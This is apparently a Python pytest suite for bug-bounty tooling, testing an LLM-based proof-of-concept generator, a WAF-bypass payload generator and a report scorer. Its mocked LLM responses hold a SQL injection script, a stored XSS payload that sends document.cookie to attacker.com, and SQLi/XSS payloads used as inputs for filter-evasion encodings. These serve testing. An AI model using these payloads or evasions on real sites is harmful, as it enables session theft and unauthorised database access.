"""
Test Suite for Bug Bounty Enhancements v2.0

Tests AI PoC generator, WAF bypass, and report scorer.
"""

import pytest
from unittest.mock import Mock, patch

from src.bugbounty.ai_poc_generator import AIPoCGenerator
from src.bugbounty.waf_bypass import WAFBypass
from src.bugbounty.report_scorer import ReportScorer


class TestAIPoCGenerator:
    """Test AI-powered PoC Generator"""
    
    @pytest.fixture
    def generator(self):
        return AIPoCGenerator()
    
    def test_generator_initialization(self, generator):
        """Test generator initializes"""
        assert generator.llm is not None
    
    @pytest.mark.asyncio
    async def test_generate_poc_sqli(self, generator):
        """Test SQL injection PoC generation"""
        with patch.object(generator.llm, 'get_completion') as mock_llm:
            mock_llm.return_value = '''
CODE:
```python
import requests
url = "https://example.com/api/user"
payload = "1' OR '1'='1"
response = requests.get(url, params={"id": payload})
print(response.text)
```

EXPLANATION:
This PoC exploits SQL injection in the id parameter.

PREREQUISITES:
- Python requests library
- Target accepts GET parameter

EXPECTED_OUTCOME:
Database error message or unauthorized data access

REMEDIATION:
Use parameterized queries

CVSS_SCORE: 8.5
RISK_LEVEL: high
'''
            
            result = await generator.generate_poc(
                vulnerability_type="sqli",
                target_url="https://example.com/api/user",
                description="SQL injection in id parameter"
            )
            
            assert result["success"] is True
            assert "poc_code" in result
            assert len(result["poc_code"]) > 0
            assert result["cvss_score"] > 0
    
    @pytest.mark.asyncio
    async def test_generate_exploit_chain(self, generator):
        """Test chained exploit generation"""
        vulns = [
            {
                "type": "IDOR",
                "url": "https://example.com/api/user/profile",
                "description": "Can access other profiles"
            },
            {
                "type": "XSS",
                "url": "https://example.com/comment",
                "description": "Stored XSS in comments"
            }
        ]
        
        with patch.object(generator.llm, 'get_completion') as mock_llm:
            mock_llm.return_value = '''
CHAIN_FLOW:
1. Use IDOR to access admin profile
2. Inject XSS payload in admin comment
3. Wait for admin to view comment
4. Steal admin session

POC_CODE:
```python
# Step 1: IDOR
admin_profile = requests.get("https://example.com/api/user/profile?id=1")

# Step 2: XSS injection
xss_payload = "<script>fetch('https://attacker.com?cookie='+document.cookie)</script>"
requests.post("https://example.com/comment", data={"text": xss_payload})
```

IMPACT:
Complete account takeover via chained vulnerabilities

CVSS_SCORE: 9.5
RISK_LEVEL: critical
'''
            
            result = await generator.generate_exploit_chain(vulns)
            
            assert result["success"] is True
            assert result["chain_length"] == 2
            assert len(result["poc_code"]) > 0


class TestWAFBypass:
    """Test WAF Bypass Techniques"""
    
    @pytest.fixture
    def waf(self):
        return WAFBypass()
    
    def test_waf_initialization(self, waf):
        """Test WAF bypass initializes"""
        assert waf is not None
    
    def test_generate_bypass_payloads_sqli(self, waf):
        """Test SQL injection bypass payloads"""
        original = "' OR 1=1--"
        payloads = waf.generate_bypass_payloads(original, "sqli")
        
        assert len(payloads) > 0
        assert any("technique" in p for p in payloads)
        assert any("payload" in p for p in payloads)
    
    def test_url_encoding_variants(self, waf):
        """Test URL encoding techniques"""
        payload = "' OR '1'='1"
        variants = waf._url_encoding_variants(payload)
        
        assert len(variants) >= 3  # Single, double, mixed
        assert any("Single" in v["technique"] for v in variants)
        assert any("Double" in v["technique"] for v in variants)
    
    def test_case_variation(self, waf):
        """Test case variation techniques"""
        payload = "SELECT * FROM users"
        variants = waf._case_variation(payload)
        
        assert len(variants) >= 3  # Upper, lower, random
        assert any(v["payload"].isupper() for v in variants)
        assert any(v["payload"].islower() for v in variants)
    
    def test_sql_comment_injection(self, waf):
        """Test SQL comment injection"""
        payload = "SELECT * FROM users WHERE id=1"
        variants = waf._sql_comment_injection(payload)
        
        assert len(variants) > 0
        assert any("/**/" in v["payload"] for v in variants)
    
    def test_html_entity_encoding(self, waf):
        """Test HTML entity encoding for XSS"""
        payload = "<script>alert(1)</script>"
        variants = waf._html_entity_encoding(payload)
        
        assert len(variants) >= 3
        assert any("&#" in v["payload"] for v in variants)  # Decimal entities
    
    def test_javascript_obfuscation(self, waf):
        """Test JavaScript obfuscation"""
        payload = "alert(document.cookie)"
        variants = waf._javascript_obfuscation(payload)
        
        assert len(variants) > 0
        assert any("fromCharCode" in v["payload"] for v in variants)


class TestReportScorer:
    """Test Bug Bounty Report Scorer"""
    
    @pytest.fixture
    def scorer(self):
        return ReportScorer()
    
    def test_scorer_initialization(self, scorer):
        """Test scorer initializes"""
        assert scorer.scoring_criteria is not None
        assert "title" in scorer.scoring_criteria
        assert "description" in scorer.scoring_criteria
    
    def test_score_excellent_report(self, scorer):
        """Test scoring of excellent quality report"""
        excellent_report = {
            "title": "Reflected XSS in Search Parameter Allows Session Hijacking on example.com",
            "description": "A reflected cross-site scripting vulnerability was discovered in the search functionality of example.com. This vulnerability allows an attacker to inject malicious JavaScript code that executes in the context of the victim's browser. The vulnerability exists because user input in the 'q' parameter is not properly sanitized before being reflected in the HTML response. This can lead to session hijacking, credential theft, and other client-side attacks. The impact is significant as the search feature is prominently used across the site.",
            "steps_to_reproduce": "1. Navigate to https://example.com/search\n2. Enter the following payload in the search box: <script>alert(document.cookie)</script>\n3. Submit the search form\n4. Observe that the JavaScript executes in the browser\n5. Verify that the cookie is displayed in the alert box\n6. Confirm that the payload is reflected without sanitization",
            "impact": "An attacker can exploit this vulnerability to steal user session cookies, perform actions on behalf of authenticated users, redirect users to malicious sites, and execute arbitrary JavaScript in the victim's browser context. This could lead to complete account compromise, data theft, and widespread phishing attacks against users of the platform.",
            "proof_of_concept": "curl 'https://example.com/search?q=<script>alert(document.cookie)</script>'\n\nAlternatively:\npython3 xss_poc.py --target https://example.com/search --payload \"<script>alert(1)</script>\"",
            "attachments": ["screenshot_xss_triggered.png", "burp_request_response.png", "poc_video.mp4"]
        }
        
        result = scorer.score_report(excellent_report)
        
        assert result["percentage"] >= 75  # Excellent reports should score 75%+
        assert result["quality_rating"] in ["Excellent ⭐⭐⭐⭐⭐", "Very Good ⭐⭐⭐⭐", "Good ⭐⭐⭐"]
        assert "submit" in result["submit_recommendation"].lower()  # Can be "Ready to submit" or "Consider submitting"
    
    def test_score_poor_report(self, scorer):
        """Test scoring of poor quality report"""
        poor_report = {
            "title": "XSS",
            "description": "Found XSS",
            "steps_to_reproduce": "Just test it",
            "impact": "Bad",
            "proof_of_concept": "",
            "attachments": []
        }
        
        result = scorer.score_report(poor_report)
        
        assert result["percentage"] < 50  # Poor reports should score low
        assert len(result["recommendations"]) > 0  # Should have recommendations
        assert "❌" in result["submit_recommendation"]  # Should not recommend submission
    
    def test_score_title(self, scorer):
        """Test title scoring"""
        good_title = "SQL Injection in Login Form Allows Authentication Bypass"
        score_good = scorer._score_title(good_title)
        assert score_good["score"] >= 7
        
        bad_title = "Bug"
        score_bad = scorer._score_title(bad_title)
        assert score_bad["score"] < 5
    
    def test_score_steps(self, scorer):
        """Test steps to reproduce scoring"""
        good_steps = """1. Navigate to https://example.com/login
2. Enter ' OR '1'='1 in the username field
3. Enter any password
4. Click Submit
5. Observe successful authentication bypass"""
        
        score = scorer._score_steps(good_steps)
        assert score["score"] >= 15  # Good numbered steps
    
    def test_breakdown_generation(self, scorer):
        """Test scoring breakdown"""
        report = {
            "title": "Test: SQL Injection in API Endpoint",
            "description": "A SQL injection vulnerability exists",
            "steps_to_reproduce": "1. Test\n2. Verify",
            "impact": "Attackers can access database",
            "proof_of_concept": "curl test",
            "attachments": ["test.png"]
        }
        
        result = scorer.score_report(report)
        
        assert "breakdown" in result
        assert len(result["breakdown"]) == 6  # All categories
        assert all("status" in item for item in result["breakdown"])


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])
